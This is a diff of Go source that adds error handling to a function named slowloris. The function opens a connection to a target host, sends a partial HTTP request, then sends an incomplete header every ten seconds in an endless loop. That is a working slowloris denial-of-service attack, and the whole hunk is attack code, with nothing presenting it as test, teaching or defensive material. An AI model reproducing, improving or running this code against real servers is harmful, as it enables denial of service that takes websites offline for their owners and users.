@@ -30,16 +30,41 @@ func slowloris(target string) {
 		fmt.Println("Error connecting:", err)
 		return
 	}
-	defer conn.Close()
+	defer func() {
+		if err := conn.Close(); err != nil {
+			fmt.Printf("Failed to close the connection: %v", err)
+		}
+	}()
 
 	// Send partial HTTP request
-	fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
-	fmt.Fprintf(conn, "Host: %s\r\n", target)
-	fmt.Fprintf(conn, "User-Agent: Mozilla/5.0\r\n")
+	if err := writeOrFail(conn, "GET / HTTP/1.1\r\n"); err != nil {
+		return
+	}
+	if err := writeOrFail(conn, "Host: %s\r\n", target); err != nil {
+		return
+	}
+	if err := writeOrFail(conn, "User-Agent: Mozilla/5.0\r\n"); err != nil {
+		return
+	}
 
 	for {
 		// Send incomplete header periodically
-		fmt.Fprintf(conn, "X-a: %d\r\n", time.Now().UnixNano())
+		if err := writeOrFail(conn, "X-a: %d\r\n", time.Now().UnixNano()); err != nil {
+			return
+		}
 		time.Sleep(10 * time.Second)
 	}
+}
+
+func writeOrFail(conn net.Conn, format string, args ...interface{}) error {
+	_, err := fmt.Fprintf(conn, format, args...)
+	if err != nil {
+		fmt.Printf("Write failed: %v", err)
+		defer func() {
+			if err := conn.Close(); err != nil {
+				fmt.Printf("Failed to close the connection: %v", err)
+			}
+		}()
+	}
+	return err
 }
